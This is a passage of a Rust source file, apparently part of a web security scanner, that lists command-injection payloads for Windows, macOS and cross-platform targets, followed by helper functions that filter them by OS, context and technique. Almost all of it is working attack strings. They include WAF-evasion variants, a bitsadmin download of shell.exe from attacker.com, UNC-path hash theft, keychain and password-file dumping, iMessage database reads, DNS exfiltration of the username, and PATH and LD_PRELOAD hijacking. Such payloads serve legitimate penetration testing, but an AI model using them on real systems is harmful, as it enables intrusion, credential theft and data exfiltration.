    // Windows WAF bypass
    CmdiV2Payload {
        payload: "& w^h^o^a^m^i",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Caret insertion bypass",
    },
    CmdiV2Payload {
        payload: "& %COMSPEC% /c whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "COMSPEC variable expansion",
    },
    CmdiV2Payload {
        payload: "& set a=who&set b=ami&call %a%%b%",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "Variable concatenation bypass",
    },
    CmdiV2Payload {
        payload: "& cmd /V:ON /C \"set a=who&set b=ami&echo !a!!b!\"",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "Delayed expansion bypass",
    },
    CmdiV2Payload {
        payload: "& powershell -nop -c whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "PowerShell no-profile exec",
    },
    CmdiV2Payload {
        payload: "& powershell -w hidden -c whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "PowerShell hidden window",
    },
    CmdiV2Payload {
        payload: "& c\\m\\d /c whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Backslash path separator bypass",
    },
    CmdiV2Payload {
        payload: "& \"cmd\" /c whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassConcatenation,
        description: "Quoted command bypass",
    },
    CmdiV2Payload {
        payload: "& %SystemRoot%\\System32\\cmd.exe /c whoami",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::WafBypassVariableExpansion,
        description: "Full path via SystemRoot",
    },
    CmdiV2Payload {
        payload: "& wmic process call create \"cmd /c whoami > C:\\tmp\\out.txt\"",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "WMIC process creation",
    },
    CmdiV2Payload {
        payload: "& mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"cmd /c whoami\"\", 0:close\")",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "MSHTA VBScript exec",
    },
    CmdiV2Payload {
        payload: "& forfiles /p c:\\windows\\system32 /m cmd.exe /c \"cmd /c whoami\"",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Forfiles indirect exec",
    },
    CmdiV2Payload {
        payload: "& assoc .pwn=exefile",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "File association hijack",
    },
    CmdiV2Payload {
        payload: "& bitsadmin /transfer job http://attacker.com/shell.exe C:\\tmp\\shell.exe",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "BITS download",
    },
    CmdiV2Payload {
        payload: "& net use \\\\attacker.com\\share",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "UNC path for hash theft",
    },
    CmdiV2Payload {
        payload: "& rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write(new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c whoami\"))",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Rundll32 JavaScript exec",
    },
    CmdiV2Payload {
        payload: "& cscript //E:JScript \\\\attacker.com\\share\\shell.js",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "CScript JScript remote exec",
    },
    CmdiV2Payload {
        payload: "& whoami /priv",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "User privileges",
    },
    CmdiV2Payload {
        payload: "& fsutil dirty query C:",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Volume dirty bit (admin check)",
    },
    CmdiV2Payload {
        payload: "& echo %USERDOMAIN%\\%USERNAME%",
        os: CmdiOs::Windows,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Domain\\username echo",
    },
];

// ---------------------------------------------------------------------------
// macOS payloads (30+)
// ---------------------------------------------------------------------------
const MACOS_PAYLOADS: &[CmdiV2Payload] = &[
    CmdiV2Payload {
        payload: "; id",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Basic id command",
    },
    CmdiV2Payload {
        payload: "; whoami",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Current user",
    },
    CmdiV2Payload {
        payload: "; sw_vers",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "macOS version",
    },
    CmdiV2Payload {
        payload: "; system_profiler SPSoftwareDataType",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Software profile",
    },
    CmdiV2Payload {
        payload: "; system_profiler SPHardwareDataType",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Hardware profile",
    },
    CmdiV2Payload {
        payload: "; dscl . -list /Users",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "User listing via directory services",
    },
    CmdiV2Payload {
        payload: "; defaults read",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Read user defaults",
    },
    CmdiV2Payload {
        payload: "; security find-generic-password -a '' -w",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Keychain password extraction",
    },
    CmdiV2Payload {
        payload: "; security dump-keychain",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Dump keychain entries",
    },
    CmdiV2Payload {
        payload: "; cat /etc/master.passwd",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "macOS password file",
    },
    CmdiV2Payload {
        payload: "; launchctl list",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "LaunchDaemon listing",
    },
    CmdiV2Payload {
        payload: "; osascript -e 'tell application \"System Events\" to get name of every process'",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "AppleScript process list",
    },
    CmdiV2Payload {
        payload: "; osascript -e 'do shell script \"id\"'",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "AppleScript shell execution",
    },
    CmdiV2Payload {
        payload: "; cat ~/Library/Keychains/login.keychain-db",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Read keychain database",
    },
    CmdiV2Payload {
        payload: "; networksetup -listallhardwareports",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Network hardware ports",
    },
    CmdiV2Payload {
        payload: "; scutil --dns",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "DNS configuration",
    },
    CmdiV2Payload {
        payload: "; airport -s 2>/dev/null || /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "WiFi network scan",
    },
    CmdiV2Payload {
        payload: "; cat /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Airport preferences (stored WiFi)",
    },
    CmdiV2Payload {
        payload: "; plutil -p /Library/Preferences/com.apple.alf.plist",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Application firewall config",
    },
    CmdiV2Payload {
        payload: "; fdesetup status",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "FileVault encryption status",
    },
    CmdiV2Payload {
        payload: "; csrutil status",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "SIP protection status",
    },
    CmdiV2Payload {
        payload: "; sqlite3 ~/Library/Messages/chat.db 'SELECT * FROM message LIMIT 5'",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "iMessage database read",
    },
    CmdiV2Payload {
        payload: "; cat ~/.zsh_history",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Zsh history (default macOS shell)",
    },
    CmdiV2Payload {
        payload: "; profiles list",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "MDM profiles listing",
    },
    CmdiV2Payload {
        payload: "; spctl --status",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Gatekeeper status",
    },
    CmdiV2Payload {
        payload: "; pmset -g",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Power management settings",
    },
    CmdiV2Payload {
        payload: "; sysctl -a",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Kernel parameters",
    },
    CmdiV2Payload {
        payload: "; kextstat",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Loaded kernel extensions",
    },
    CmdiV2Payload {
        payload: "; ls -la /Applications/",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Installed applications",
    },
    CmdiV2Payload {
        payload: "; log show --predicate 'eventMessage contains \"ssh\"' --last 1h",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::InlineExecution,
        description: "Unified log SSH events",
    },
    CmdiV2Payload {
        payload: "; sleep 5",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindTimeBased,
        description: "macOS sleep time-based",
    },
    CmdiV2Payload {
        payload: "; nslookup $(whoami).attacker.com",
        os: CmdiOs::MacOs,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "macOS DNS exfil",
    },
];

// ---------------------------------------------------------------------------
// Cross-platform / environment manipulation
// ---------------------------------------------------------------------------
const CROSS_PLATFORM_PAYLOADS: &[CmdiV2Payload] = &[
    CmdiV2Payload {
        payload: "; env",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::EnvironmentManipulation,
        description: "Dump environment variables",
    },
    CmdiV2Payload {
        payload: "; export PATH=/tmp:$PATH; backdoor",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::EnvironmentManipulation,
        description: "PATH hijacking",
    },
    CmdiV2Payload {
        payload: "; LD_PRELOAD=/tmp/evil.so command",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::EnvironmentManipulation,
        description: "LD_PRELOAD injection",
    },
    CmdiV2Payload {
        payload: "; HTTP_PROXY=http://attacker.com curl target.com",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::EnvironmentManipulation,
        description: "HTTP_PROXY interception",
    },
    CmdiV2Payload {
        payload: "'; exec id #",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::InlineExecution,
        description: "Quote break exec chain",
    },
    CmdiV2Payload {
        payload: "\"; exec id #",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::InlineExecution,
        description: "Double-quote break exec",
    },
    CmdiV2Payload {
        payload: "$(touch /tmp/pwned)",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::DollarParen,
        technique: CmdiTechnique::BlindFileWrite,
        description: "Subshell file creation",
    },
    CmdiV2Payload {
        payload: "`touch /tmp/pwned`",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Backtick,
        technique: CmdiTechnique::BlindFileWrite,
        description: "Backtick file creation",
    },
    CmdiV2Payload {
        payload: "| curl attacker.com",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::PipeChain,
        technique: CmdiTechnique::BlindDns,
        description: "Pipe to curl callback",
    },
    CmdiV2Payload {
        payload: "|| curl attacker.com",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Shell,
        technique: CmdiTechnique::BlindDns,
        description: "OR to curl callback",
    },
    CmdiV2Payload {
        payload: "system('id')",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::System,
        technique: CmdiTechnique::InlineExecution,
        description: "PHP system() function injection",
    },
    CmdiV2Payload {
        payload: "exec('id')",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Exec,
        technique: CmdiTechnique::InlineExecution,
        description: "PHP exec() function injection",
    },
    CmdiV2Payload {
        payload: "passthru('id')",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::System,
        technique: CmdiTechnique::InlineExecution,
        description: "PHP passthru() function injection",
    },
    CmdiV2Payload {
        payload: "popen('id','r')",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Popen,
        technique: CmdiTechnique::InlineExecution,
        description: "PHP popen() function injection",
    },
    CmdiV2Payload {
        payload: "proc_open('id',array(),$p)",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Popen,
        technique: CmdiTechnique::InlineExecution,
        description: "PHP proc_open() injection",
    },
    CmdiV2Payload {
        payload: "shell_exec('id')",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::System,
        technique: CmdiTechnique::InlineExecution,
        description: "PHP shell_exec() injection",
    },
    CmdiV2Payload {
        payload: "os.system('id')",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::System,
        technique: CmdiTechnique::InlineExecution,
        description: "Python os.system() injection",
    },
    CmdiV2Payload {
        payload: "os.popen('id').read()",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::Popen,
        technique: CmdiTechnique::InlineExecution,
        description: "Python os.popen() injection",
    },
    CmdiV2Payload {
        payload: "subprocess.call('id',shell=True)",
        os: CmdiOs::CrossPlatform,
        context: CmdiContext::System,
        technique: CmdiTechnique::InlineExecution,
        description: "Python subprocess injection",
    },
];

/// Returns all Command Injection V2 payloads.
pub fn all_cmdi_v2_payloads() -> Vec<&'static CmdiV2Payload> {
    let mut all = Vec::with_capacity(300);
    all.extend(LINUX_INLINE_PAYLOADS.iter());
    all.extend(LINUX_BLIND_PAYLOADS.iter());
    all.extend(LINUX_WAF_BYPASS_PAYLOADS.iter());
    all.extend(WINDOWS_PAYLOADS.iter());
    all.extend(MACOS_PAYLOADS.iter());
    all.extend(CROSS_PLATFORM_PAYLOADS.iter());
    all
}

/// Filter payloads by target OS.
pub fn cmdi_v2_payloads_by_os(os: CmdiOs) -> Vec<&'static CmdiV2Payload> {
    all_cmdi_v2_payloads()
        .into_iter()
        .filter(|p| p.os == os)
        .collect()
}

/// Filter payloads by injection context.
pub fn cmdi_v2_payloads_by_context(context: CmdiContext) -> Vec<&'static CmdiV2Payload> {
    all_cmdi_v2_payloads()
        .into_iter()
        .filter(|p| p.context == context)
        .collect()
}

/// Filter payloads by technique.
pub fn cmdi_v2_payloads_by_technique(technique: CmdiTechnique) -> Vec<&'static CmdiV2Payload> {
    all_cmdi_v2_payloads()
        .into_iter()
        .filter(|p| p.technique == technique)
        .collect()
}

/// Return all WAF bypass payloads.
pub fn cmdi_v2_waf_bypass_payloads() -> Vec<&'static CmdiV2Payload> {
    all_cmdi_v2_payloads()
        .into_iter()
        .filter(|p| {
            matches!(
                p.technique,
                CmdiTechnique::WafBypassVariableExpansion
                    | CmdiTechnique::WafBypassBraceExpansion
                    | CmdiTechnique::WafBypassIfsTrick
                    | CmdiTechnique::WafBypassWildcard
                    | CmdiTechnique::WafBypassEncoding
                    | CmdiTechnique::WafBypassConcatenation
                    | CmdiTechnique::WafBypassNewline
            )
        })
        .collect()
}

/// Total count of all Command Injection V2 payloads.
pub fn cmdi_v2_payload_count() -> usize {
    LINUX_INLINE_PAYLOADS.len()
        + LINUX_BLIND_PAYLOADS.len()
        + LINUX_WAF_BYPASS_PAYLOADS.len()
        + WINDOWS_PAYLOADS.len()
        + MACOS_PAYLOADS.len()
        + CROSS_PLATFORM_PAYLOADS.len()
}
